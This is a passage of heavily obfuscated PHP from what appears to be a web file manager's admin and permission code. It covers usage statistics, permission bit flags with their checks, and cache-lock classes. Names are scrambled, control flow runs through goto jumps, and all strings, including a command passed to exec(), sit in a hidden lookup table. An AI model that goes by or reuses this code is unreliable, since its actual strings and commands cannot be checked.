$DÆù‘à²Ğ²[] = $Aî¦˜íÊ³¯; } } goto f²¤óæš‡‡; f²¤óæš‡‡: return $DÆù‘à²Ğ²; goto fß—ğÁÔÏ; eöË‘óŸ·†: $F£Œ­°Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->init($b•ğ”éÄõ¿)) { return !1; } $dĞŒÜö»ğ¢ = $this->trendList($b•ğ”éÄõ¿); goto fµªøÈĞ½Ï; fß—ğÁÔÏ: } public function validDate($C§Ú¾éÍ„Ù, $CÕÊ¬Ú‹) { goto cßß¦ÂË; cßß¦ÂË: $D‚Ò¦ö¥±² =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eõ×¢ä“ = date($D‚Ò¦ö¥±²[2041], strtotime($D‚Ò¦ö¥±²[2042])); $EøºÆ„·› = array($eõ×¢ä“); goto Fê¬”ÍÍ²æ; Fê¬”ÍÍ²æ: switch ($C§Ú¾éÍ„Ù) { case $D‚Ò¦ö¥±²[1419]: $A‹¡Ö‹›‡µ = mktime(0, 0, 0, date($D‚Ò¦ö¥±²[2058]), date($D‚Ò¦ö¥±²[2059]) - date($D‚Ò¦ö¥±²[1225]) + 7 - 7, date($D‚Ò¦ö¥±²[2060])); $dô†ŒğŠÆË = 0; do { $eÉ„ÖéÛ§¶ = date($D‚Ò¦ö¥±²[2041], $A‹¡Ö‹›‡µ - 3600 * 24 * 7 * $dô†ŒğŠÆË); $EøºÆ„·›[] = $eÉ„ÖéÛ§¶; $dô†ŒğŠÆË++; } while ($CÕÊ¬Ú‹ < $eÉ„ÖéÛ§¶); break; case $D‚Ò¦ö¥±²[1417]: $dô†ŒğŠÆË = 1; do { $Dåâ„ºë¨¸ = date($D‚Ò¦ö¥±²[2061], strtotime("\x2d\x20{$dô†ŒğŠÆË}\40\155\157\156\164\150\163")); $EøºÆ„·›[] = $Dåâ„ºë¨¸; $dô†ŒğŠÆË++; } while ($CÕÊ¬Ú‹ < $Dåâ„ºë¨¸); break; case $D‚Ò¦ö¥±²[1726]: $EĞ¹œÌ—œ½ = (int) date($D‚Ò¦ö¥±²[2060], strtotime($CÕÊ¬Ú‹)); $CŞ¸»††ËŸ = (int) date($D‚Ò¦ö¥±²[2060]); if ($EĞ¹œÌ—œ½ >= $CŞ¸»††ËŸ) { break; } for ($EĞ¹œÌ—œ½; $EĞ¹œÌ—œ½ < $CŞ¸»††ËŸ; $EĞ¹œÌ—œ½++) { $EøºÆ„·›[] = $EĞ¹œÌ—œ½ . $D‚Ò¦ö¥±²[2062]; } break; default: break; } if ($CÕÊ¬Ú‹ > end($EøºÆ„·›)) { array_pop($EøºÆ„·›); } sort($EøºÆ„·›); goto a½èäŒ¶›Ğ; a½èäŒ¶›Ğ: return $EøºÆ„·›; goto d«å ‚çÚÇ; d«å ‚çÚÇ: } public function listTable($CŒâ‚¹¸º…) { $F²¯ŞÛá¹ö = ucfirst($CŒâ‚¹¸º…); return Model($F²¯ŞÛá¹ö)->listData(); } public function option($AÑÎáİµõÆ) { $DÌ¬Ü§“Ó = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2063] . ucfirst($AÑÎáİµõÆ); return $this->{$DÌ¬Ü§“Ó}(); } private function optionUser() { goto dµ®ÁÀôÇß; dµ®ÁÀôÇß: $D¿¹ßŞí±‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a›„çÆ¸Ë = Model($D¿¹ßŞí±‡[479])->count($D¿¹ßŞí±‡[1437]); $bôŠùà‘Š = Model($D¿¹ßŞí±‡[479])->where($D¿¹ßŞí±‡[2064])->count($D¿¹ßŞí±‡[1437]); goto cÊòÎâ®÷Ê; cÊòÎâ®÷Ê: $E©Óâó‡˜ = strtotime($D¿¹ßŞí±‡[2065]); $CÀİ®„à‹â = array($D¿¹ßŞí±‡[2066] => array($D¿¹ßŞí±‡[924], $E©Óâó‡˜)); $AƒŒ§ö×‹İ = (int) Model($D¿¹ßŞí±‡[479])->where($CÀİ®„à‹â)->count($D¿¹ßŞí±‡[1437]); goto C²ºÛŠÀğÛ; A–ÉÀç„²·: $eæùùÌÎà‚ = Model($D¿¹ßŞí±‡[479])->where($CÀİ®„à‹â)->count($D¿¹ßŞí±‡[1437]); return array($D¿¹ßŞí±‡[689] => (int) $a›„çÆ¸Ë, $D¿¹ßŞí±‡[2067] => (int) ($a›„çÆ¸Ë - $bôŠùà‘Š), $D¿¹ßŞí±‡[2068] => (int) $bôŠùà‘Š, $D¿¹ßŞí±‡[2069] => (int) $eæùùÌÎà‚, $D¿¹ßŞí±‡[2070] => $AƒŒ§ö×‹İ); goto e“²”Ò®ê; C²ºÛŠÀğÛ: if (!$AƒŒ§ö×‹İ) { $AƒŒ§ö×‹İ = 1; } $E©Óâó‡˜ = strtotime(date($D¿¹ßŞí±‡[2045])); $CÀİ®„à‹â = array($D¿¹ßŞí±‡[2066] => array($D¿¹ßŞí±‡[924], $E©Óâó‡˜)); goto A–ÉÀç„²·; e“²”Ò®ê: } private function optionFile() { goto eÉÎ¥ì¡¶Ë; Fê…æÙ£Ùô: $a„¨¾´”šù = Model($e¿æÔ½‹Å×[754])->where($dÆ¹º½£)->sum($e¿æÔ½‹Å×[77]); $CĞÙÑº¨¸” = Model($e¿æÔ½‹Å×[754])->where($dÆ¹º½£)->count($e¿æÔ½‹Å×[369]); return array($e¿æÔ½‹Å×[692] => $CŸ«šäİ¨ğ, $e¿æÔ½‹Å×[2038] => $dÛ«ĞãÎÑ, $e¿æÔ½‹Å×[2071] => $CŸ«šäİ¨ğ - $dÛ«ĞãÎÑ, $e¿æÔ½‹Å×[2072] => (int) $a„¨¾´”šù, $e¿æÔ½‹Å×[694] => (int) $Dï¹¦‹·•, $e¿æÔ½‹Å×[2073] => (int) $CĞÙÑº¨¸”); goto FÉêª™ôí›; BÔ÷ëÏœ¾•: $dÛ«ĞãÎÑ = $f•«Ï¥Ã“¾[$e¿æÔ½‹Å×[2038]]; $Dï¹¦‹·• = Model($e¿æÔ½‹Å×[754])->where(array($e¿æÔ½‹Å×[370] => 0))->count($e¿æÔ½‹Å×[369]); $dÆ¹º½£ = array($e¿æÔ½‹Å×[370] => 0, $e¿æÔ½‹Å×[187] => array($e¿æÔ½‹Å×[924], strtotime(date($e¿æÔ½‹Å×[2045])))); goto Fê…æÙ£Ùô; eÉÎ¥ì¡¶Ë: $e¿æÔ½‹Å× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f•«Ï¥Ã“¾ = $this->sourceSize(); $CŸ«šäİ¨ğ = $f•«Ï¥Ã“¾[$e¿æÔ½‹Å×[77]]; goto BÔ÷ëÏœ¾•; FÉêª™ôí›: } private function optionAccess() { $dôëäË¼Œæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($dôëäË¼Œæ[689] => $this->typeLogCnt(), $dôëäË¼Œæ[103] => $this->typeLogCnt($dôëäË¼Œæ[103]), $dôëäË¼Œæ[404] => $this->typeLogCnt($dôëäË¼Œæ[404]), $dôëäË¼Œæ[2074] => $this->typeLogCnt($dôëäË¼Œæ[2074]), $dôëäË¼Œæ[2075] => $this->typeLogCnt($dôëäË¼Œæ[2075]), $dôëäË¼Œæ[537] => $this->typeLogCnt($dôëäË¼Œæ[33], $dôëäË¼Œæ[2049])); } private function typeLogCnt($Aì¾õ²»Ç‚ = '', $aœÇÔ¼¢Ü„ = "\151\x64") { goto D‰¿ˆ·»¾¨; aÂÃœ¨‡Ô¾: $C²È„×« = array($dè‚ä’ñ‡Ù[187] => array($dè‚ä’ñ‡Ù[924], $C¦ÆÑëÔ‡)); if ($Aì¾õ²»Ç‚) { $C²È„×«[$dè‚ä’ñ‡Ù[29]] = array($dè‚ä’ñ‡Ù[7], $F–ø˜‘„ó—[$Aì¾õ²»Ç‚]); } $eØã„¼õŒ = Model($dè‚ä’ñ‡Ù[2048])->where($C²È„×«)->count($aœÇÔ¼¢Ü„); goto EÙÇÇ…ƒÇ›; EÙÇÇ…ƒÇ›: return (int) $eØã„¼õŒ; goto cªÙˆÃŒ; D‰¿ˆ·»¾¨: $dè‚ä’ñ‡Ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F–ø˜‘„ó— = array($dè‚ä’ñ‡Ù[103] => array($dè‚ä’ñ‡Ù[2076], $dè‚ä’ñ‡Ù[2077]), $dè‚ä’ñ‡Ù[404] => array($dè‚ä’ñ‡Ù[2078], $dè‚ä’ñ‡Ù[2079]), $dè‚ä’ñ‡Ù[2074] => array($dè‚ä’ñ‡Ù[2080], $dè‚ä’ñ‡Ù[2081], $dè‚ä’ñ‡Ù[2082]), $dè‚ä’ñ‡Ù[2075] => array($dè‚ä’ñ‡Ù[2083], $dè‚ä’ñ‡Ù[2084]), $dè‚ä’ñ‡Ù[2085] => array($dè‚ä’ñ‡Ù[2086], $dè‚ä’ñ‡Ù[2087], $dè‚ä’ñ‡Ù[2088])); $C¦ÆÑëÔ‡ = strtotime(date($dè‚ä’ñ‡Ù[2045])); goto aÂÃœ¨‡Ô¾; cªÙˆÃŒ: } private function optionServer() { goto aŒÔ©¡•Ï; Açó¤ö„æ²: return array($BËšœìØ¨[2091] => $aÒæàÓ×ä ? $aÒæàÓ×ä[$BËšœìØ¨[2092]] : 0, $BËšœìØ¨[2093] => $aÒæàÓ×ä ? $aÒæàÓ×ä[$BËšœìØ¨[2094]] : 0, $BËšœìØ¨[2095] => (int) $eÑˆ¸…’äÁ[$BËšœìØ¨[2092]] * 1024 * 1024 * 1024, $BËšœìØ¨[2096] => (int) $CˆÍÍÔÛ‚¥, $BËšœìØ¨[2097] => ucfirst($Däˆ¬‚ö), $BËšœìØ¨[2098] => $BËšœìØ¨[2099] . PHP_VERSION, $BËšœìØ¨[2100] => phpBuild64() ? 64 : 32, $BËšœìØ¨[688] => str_replace($BËšœìØ¨[2101], $BËšœìØ¨[900], $A‰‘›åÚÉ), $BËšœìØ¨[337] => ucfirst($BšÇÊ²í•´), $BËšœìØ¨[28] => $_SERVER[$BËšœìØ¨[2102]]); goto cŒÃŞ»„ôà; aŒÔ©¡•Ï: $BËšœìØ¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÒæàÓ×ä = $this->diskDriver(); $eÑˆ¸…’äÁ = KodIO::defaultDriver(); goto fÃÃ…ô¤ù; fÃÃ…ô¤ù: $E¦ğï×†ñÈ = array($BËšœìØ¨[745] => $eÑˆ¸…’äÁ[$BËšœìØ¨[367]]); $CˆÍÍÔÛ‚¥ = Model($BËšœìØ¨[422])->where($E¦ğï×†ñÈ)->sum($BËšœìØ¨[77]); $cÅÇ‡ĞÎĞâ = explode($BËšœìØ¨[50], $_SERVER[$BËšœìØ¨[139]]); goto E¤¦„šåğ¦; b…“Âª…†: if ($A‰‘›åÚÉ == $BËšœìØ¨[725]) { $Bğ¨é‡† = explode($BËšœìØ¨[1073], $eî†ìÖÓ‘¹[$BËšœìØ¨[883]]); $A‰‘›åÚÉ = $Bğ¨é‡†[0]; } if ($A‰‘›åÚÉ == $BËšœìØ¨[728] || $A‰‘›åÚÉ == $BËšœìØ¨[729]) { $a—£Á…•š = Model()->db()->query($BËšœìØ¨[2089]); $f÷Æ¦ÉÉ‹ê = $a—£Á…•š[0] && isset($a—£Á…•š[0][$BËšœìØ¨[1342]]) ? $a—£Á…•š[0][$BËšœìØ¨[1342]] : 0; $A‰‘›åÚÉ = $BËšœìØ¨[2090] . ($f÷Æ¦ÉÉ‹ê ? $BËšœìØ¨[8] . $f÷Æ¦ÉÉ‹ê : $BËšœìØ¨[33]); } $BšÇÊ²í•´ = $GLOBALS[$BËšœìØ¨[6]][$BËšœìØ¨[337]][$BËšœìØ¨[756]]; goto Açó¤ö„æ²; E¤¦„šåğ¦: $Däˆ¬‚ö = $cÅÇ‡ĞÎĞâ[0]; $eî†ìÖÓ‘¹ = $GLOBALS[$BËšœìØ¨[6]][$BËšœìØ¨[17]]; $A‰‘›åÚÉ = $eî†ìÖÓ‘¹[$BËšœìØ¨[884]]; goto b…“Âª…†; cŒÃŞ»„ôà: } private function diskDriver() { goto D¹õ•Íô°; D¹õ•Íô°: $C¼šŠ»ˆĞâ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b‡Š”¾Ï½Š = $C¼šŠ»ˆĞâ[8]; $cÙº¦¨˜Úó = $GLOBALS[$C¼šŠ»ˆĞâ[6]][$C¼šŠ»ˆĞâ[2103]] == $C¼šŠ»ˆĞâ[2104]; goto E‚¦®Û™æ; E‚¦®Û™æ: if ($cÙº¦¨˜Úó) { $b‡Š”¾Ï½Š = $C¼šŠ»ˆĞâ[2105]; if (function_exists($C¼šŠ»ˆĞâ[2106])) { exec($C¼šŠ»ˆĞâ[2107], $aïê£ÛìÜâ); $b‡Š”¾Ï½Š = $aïê£ÛìÜâ[1] . $C¼šŠ»ˆĞâ[8]; } } if (!file_exists($b‡Š”¾Ï½Š)) { return; } $a†®–î¾ = @disk_total_space($b‡Š”¾Ï½Š); goto d¢™“¥…Ôá; d¢™“¥…Ôá: $Fßœ‡»„Ü¼ = $a†®–î¾ - @disk_free_space($b‡Š”¾Ï½Š); return array($C¼šŠ»ˆĞâ[2092] => $a†®–î¾, $C¼šŠ»ˆĞâ[2094] => $Fßœ‡»„Ü¼); goto BñºÚœÆÏæ; BñºÚœÆÏæ: } public function fileChart($bó”Ñ”Åš) { goto b¦ÄºˆªØ½; B¥ÉöÄèß: $fæ‹ŒÔí‚[$Cê¯î‘ÊÍ¹[371]] = 2; $eÔ›‘à•ò­ = Model($Cê¯î‘ÊÍ¹[754])->where($fæ‹ŒÔí‚)->sum($Cê¯î‘ÊÍ¹[77]); return array($Cê¯î‘ÊÍ¹[692] => $bÅÖ¾È«Æ™[$Cê¯î‘ÊÍ¹[77]], $Cê¯î‘ÊÍ¹[2038] => $bÅÖ¾È«Æ™[$Cê¯î‘ÊÍ¹[2038]], $Cê¯î‘ÊÍ¹[2039] => (int) $B¤îÇ¤£, $Cê¯î‘ÊÍ¹[2040] => (int) $eÔ›‘à•ò­); goto cÜ†§‘¨âì; b¦ÄºˆªØ½: $Cê¯î‘ÊÍ¹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($bó”Ñ”Åš[$Cê¯î‘ÊÍ¹[1437]])) { return Model($Cê¯î‘ÊÍ¹[754])->userFileTypeProfile($bó”Ñ”Åš[$Cê¯î‘ÊÍ¹[1437]]); } if (isset($bó”Ñ”Åš[$Cê¯î‘ÊÍ¹[2108]])) { return Model($Cê¯î‘ÊÍ¹[754])->groupFileTypeProfile($bó”Ñ”Åš[$Cê¯î‘ÊÍ¹[2108]]); } goto BœÂÂâÇ; BœÂÂâÇ: $bÅÖ¾È«Æ™ = $this->sourceSize(); $fæ‹ŒÔí‚ = array($Cê¯î‘ÊÍ¹[463] => 0, $Cê¯î‘ÊÍ¹[371] => 1); $B¤îÇ¤£ = Model($Cê¯î‘ÊÍ¹[754])->where($fæ‹ŒÔí‚)->sum($Cê¯î‘ÊÍ¹[77]); goto B¥ÉöÄèß; cÜ†§‘¨âì: } private function sourceSize() { $bµçñ¯Å¤š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¨ÛŞ´› = Model($bµçñ¯Å¤š[754])->where(array($bµçñ¯Å¤š[370] => 0))->sum($bµçñ¯Å¤š[77]); $FêÄÑ½œ½ = Model($bµçñ¯Å¤š[422])->sum($bµçñ¯Å¤š[77]); if ($FêÄÑ½œ½ > $a¨ÛŞ´›) { $FêÄÑ½œ½ = $a¨ÛŞ´›; } return array($bµçñ¯Å¤š[77] => (int) $a¨ÛŞ´›, $bµçñ¯Å¤š[2038] => (int) $FêÄÑ½œ½); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $cğÛÜíí¡´ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÜÒÑ™‹ùá = array(array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2109]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2111], $cğÛÜíí¡´[2112] => 6, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2115]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2116], $cğÛÜíí¡´[2112] => 1, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2117]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2118], $cğÛÜíí¡´[2112] => 2, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2119]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2118], $cğÛÜíí¡´[2112] => 3, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2120]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2121], $cğÛÜíí¡´[2112] => 4, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => self::AUTH_SHOW | self::AUTH_VIEW), array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2122]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2123], $cğÛÜíí¡´[2112] => 5, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($cğÛÜíí¡´[386] => LNG($cğÛÜíí¡´[2124]), $cğÛÜíí¡´[2110] => $cğÛÜíí¡´[2125], $cğÛÜíí¡´[2112] => 7, $cğÛÜíí¡´[2113] => 1, $cğÛÜíí¡´[2114] => 0)); return $dÜÒÑ™‹ùá; } public static function authCheck($AäĞÜÇ¥çó, $e„òì”›®Ä) { $AäĞÜÇ¥çó = intval($AäĞÜÇ¥çó); if (_get($GLOBALS, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][459])) { return !0; } if ($AäĞÜÇ¥çó <= 0) { return !1; } if (($AäĞÜÇ¥çó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AäĞÜÇ¥çó & $e„òì”›®Ä); } public static function authCheckShow($E£«„ëİ) { return self::authCheck($E£«„ëİ, self::AUTH_SHOW); } public static function authCheckView($eÄš–ğî¯) { return self::authCheck($eÄš–ğî¯, self::AUTH_VIEW); } public static function authCheckDownload($eËÕ„¾µø¼) { return self::authCheck($eËÕ„¾µø¼, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Bç“Œò”‡é) { return self::authCheck($Bç“Œò”‡é, self::AUTH_UPLOAD); } public static function authCheckEdit($DÆ£ŞÃèÛÙ) { return self::authCheck($DÆ£ŞÃèÛÙ, self::AUTH_EDIT); } public static function authCheckRemove($a¾•‡ÔáµÊ) { return self::authCheck($a¾•‡ÔáµÊ, self::AUTH_REMOVE); } public static function authCheckShare($cÁ¿Í¡‡èĞ) { return self::authCheck($cÁ¿Í¡‡èĞ, self::AUTH_SHARE); } public static function authCheckComment($c½òïšƒ®) { return self::authCheck($c½òïšƒ®, self::AUTH_COMMENT); } public static function authCheckEvent($aÃå¥ïÃÉ) { return self::authCheck($aÃå¥ïÃÉ, self::AUTH_EVENT); } public static function authCheckRoot($B¾ ÷’¬±¥) { return self::authCheck($B¾ ÷’¬±¥, self::AUTH_ROOT); } public static function authCheckAction($AÑºñ‚¢óÇ, $F‘î§äç‡) { goto bµŞó¡¿¥”; c„‚–†Œó: if (($AÑºñ‚¢óÇ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AÑºñ‚¢óÇ & $c¶‰ËãŸâª); goto CÓÜçñàñ; böÛÃË¯: $c¶‰ËãŸâª = $aö„í¢à£¥[$F‘î§äç‡]; $AÑºñ‚¢óÇ = intval($AÑºñ‚¢óÇ); if ($AÑºñ‚¢óÇ <= 0) { return !1; } goto c„‚–†Œó; bµŞó¡¿¥”: $fŒ¡”Ÿíİ› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aö„í¢à£¥ = array($fŒ¡”Ÿíİ›[2126] => self::AUTH_VIEW, $fŒ¡”Ÿíİ›[1037] => self::AUTH_DOWNLOAD, $fŒ¡”Ÿíİ›[103] => self::AUTH_UPLOAD, $fŒ¡”Ÿíİ›[2075] => self::AUTH_EDIT, $fŒ¡”Ÿíİ›[2074] => self::AUTH_REMOVE, $fŒ¡”Ÿíİ›[2085] => self::AUTH_SHARE, $fŒ¡”Ÿíİ›[341] => self::AUTH_COMMENT, $fŒ¡”Ÿíİ›[1425] => self::AUTH_EVENT, $fŒ¡”Ÿíİ›[1563] => self::AUTH_ROOT); if (!isset($aö„í¢à£¥[$F‘î§äç‡])) { return; } goto böÛÃË¯; CÓÜçñàñ: } public static function authDisable($eõ¢ øÚÜ¤, $CÖˆÌ†‰àº) { if (intval($eõ¢ øÚÜ¤) <= 0) { return 0; } return intval($eõ¢ øÚÜ¤) & ~$CÖˆÌ†‰àº; } public $optionType = "\123\x79\163\x74\x65\155\56\163\157\165\x72\143\x65\101\165\164\150\114\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\141\x75\164\150", "\x6c\x61\x62\145\154", "\144\151\x73\160\154\x61\x79", "\x73\171\x73\164\x65\155", "\163\x6f\162\164"); public function initData() { $AùÛöÈè…¾ = $this->authDefault(); foreach ($AùÛöÈè…¾ as $d÷¡ğ¨×«Û) { $this->add($d÷¡ğ¨×«Û); } } public function listData($D¢ê…¹…ÓÜ = false, $fÍ´Ë¸¢¹ò = "\163\157\162\164", $CÍñ¯Œø±ö = false) { return parent::listData($D¢ê…¹…ÓÜ, $fÍ´Ë¸¢¹ò, $CÍñ¯Œø±ö); } public function update($d•ª õ¡‚‡, $BÓä¡–Š®Œ) { $EóÌµ¸Õñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÔ‘İì± ¡ = parent::listData($d•ª õ¡‚‡); $B Î£™Ì÷„ = $this->findByName($BÓä¡–Š®Œ[$EóÌµ¸Õñ[28]]); if (!$AÔ‘İì± ¡ || $B Î£™Ì÷„ && $B Î£™Ì÷„[$EóÌµ¸Õñ[367]] != $AÔ‘İì± ¡[$EóÌµ¸Õñ[367]]) { return !1; } $this->filterAuth($BÓä¡–Š®Œ[$EóÌµ¸Õñ[376]]); return parent::update($d•ª õ¡‚‡, $BÓä¡–Š®Œ); } public function remove($a£Øó³“µã) { $B†Ê‚¨îÄ¶ = parent::listData($a£Øó³“µã); if (!$B†Ê‚¨îÄ¶ || $B†Ê‚¨îÄ¶[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1077]]) { return !1; } return parent::remove($a£Øó³“µã); } public function add($b·‚æ¥•Ç¤ = array()) { goto b±äºä´İ; b‘ØõùÉ‹: return parent::insert($b·‚æ¥•Ç¤); goto D‚ Üä“ŠÏ; D ‰‘öù•: $b·‚æ¥•Ç¤ = array_merge($B«¦™‚‘®Ç, $b·‚æ¥•Ç¤); $b·‚æ¥•Ç¤[$d®„‹•œçÜ[2130]] = $this->getSort(); $this->filterAuth($b·‚æ¥•Ç¤[$d®„‹•œçÜ[376]]); goto b‘ØõùÉ‹; b±äºä´İ: $d®„‹•œçÜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->findByName($b·‚æ¥•Ç¤[$d®„‹•œçÜ[28]])) { return !1; } $B«¦™‚‘®Ç = array($d®„‹•œçÜ[28] => $d®„‹•œçÜ[33], $d®„‹•œçÜ[376] => 1, $d®„‹•œçÜ[2127] => $d®„‹•œçÜ[2128], $d®„‹•œçÜ[2129] => 1, $d®„‹•œçÜ[1077] => 0, $d®„‹•œçÜ[2130] => 0); goto D ‰‘öù•; D‚ Üä“ŠÏ: } private function getSort() { $e¾ Ñ©¹ï” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÄ¡¬˜íŠ = parent::listData(); $E»ØÛ¯‡ö = array_to_keyvalue($bÄ¡¬˜íŠ, $e¾ Ñ©¹ï”[33], $e¾ Ñ©¹ï”[2130]); return empty($E»ØÛ¯‡ö) ? 0 : max($E»ØÛ¯‡ö) + 1; } private function filterAuth(&$e©Æ·§¯„õ) { goto fÅš­Š¥æ; fÅš­Š¥æ: if (!$e©Æ·§¯„õ) { return; } $f·îÄïœŞ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $eµÕÑïâ‘ = array(); goto fÍ ¸Î´ÈÎ; D¯ø½øäîô: foreach ($eµÕÑïâ‘ as $dß–ĞÀ•‘) { if (isset($AŸ¸À©ƒ¢[$dß–ĞÀ•‘])) { $eµÕÑïâ‘ = array_merge($eµÕÑïâ‘, $AŸ¸À©ƒ¢[$dß–ĞÀ•‘]); } } $eµÕÑïâ‘[] = self::AUTH_SHOW; $e©Æ·§¯„õ = array_sum(array_unique($eµÕÑïâ‘)); goto EÚØùÎ©­Å; fÍ ¸Î´ÈÎ: foreach ($f·îÄïœŞ as $dß–ĞÀ•‘) { if ($e©Æ·§¯„õ & $dß–ĞÀ•‘) { $eµÕÑïâ‘[] = $dß–ĞÀ•‘; } } if (in_array(self::AUTH_ROOT, $eµÕÑïâ‘)) { $e©Æ·§¯„õ = array_sum($f·îÄïœŞ); return; } $AŸ¸À©ƒ¢ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto D¯ø½øäîô; EÚØùÎ©­Å: } public function sort($CËÙµİˆÌ, $añ¢˜»³èŠ) { return parent::update($CËÙµİˆÌ, $añ¢˜»³èŠ); } } goto Dš¨º³¬; CÊÙ»Ò‡¶×: define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1935], 1); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1936], 2); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1937], 3); goto Fã¹‡±ÙÙ; Dî÷š×‰®Æ: class CacheLockMemcached { public function lock($C¨ ¾ÄÂ‹, $BÉï¦ãµš = 0) { $cÑØ†²·Ñ¬ = Cache::init(); $E÷à•„‰Ê“ = microtime(!0) + $BÉï¦ãµš; while (microtime(!0) < $E÷à•„‰Ê“) { $eÕ‘‡ÅùÍÔ = $cÑØ†²·Ñ¬->get($C¨ ¾ÄÂ‹); if (!$eÕ‘‡ÅùÍÔ || $eÕ‘‡ÅùÍÔ < microtime(!0)) { $D¾¬©íÛ½ = $cÑØ†²·Ñ¬->handle->add($C¨ ¾ÄÂ‹, $E÷à•„‰Ê“, $BÉï¦ãµš); if ($D¾¬©íÛ½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Dà„ŸÍ“¨¼) { return Cache::init()->get($Dà„ŸÍ“¨¼); } public function unlock($aÉ†„İø²È) { return Cache::init()->remove($aÉ†„İø²È); } } class CacheLockDatabase { public function lock($Aòİ”æ¸›, $CÆ‘Œ«İÕ³ = 0) { $FõÔ£™“¾è = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][758]); $b¥ÏÉÔ‘šù = microtime(!0) + $CÆ‘Œ«İÕ³; while (microtime(!0) < $b¥ÏÉÔ‘šù) { $eŒ¤¿«”è = $FõÔ£™“¾è->get($Aòİ”æ¸›); if (!$eŒ¤¿«”è || $eŒ¤¿«”è < microtime(!0)) { $bÒ¯¿Ó¸‰ = $FõÔ£™“¾è->set($Aòİ”æ¸›, $b¥ÏÉÔ‘šù); if ($bÒ¯¿Ó¸‰) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F¨æ£ƒ¡¨µ) { return Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][758])->get($F¨æ£ƒ¡¨µ); } public function unlock($dØÑ†±Âß) { Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][758])->remove($dØÑ†±Âß); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dîó´Ö¡Ÿ, $EàÓ‹åö‡à) { $e¥«Êåá°ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!class_exists($e¥«Êåá°ñ[779])) { show_json($e¥«Êåá°ñ[780], !1); } $this->cacheTime = $EàÓ‹åö‡à; $this->handle = new Memcached(); if 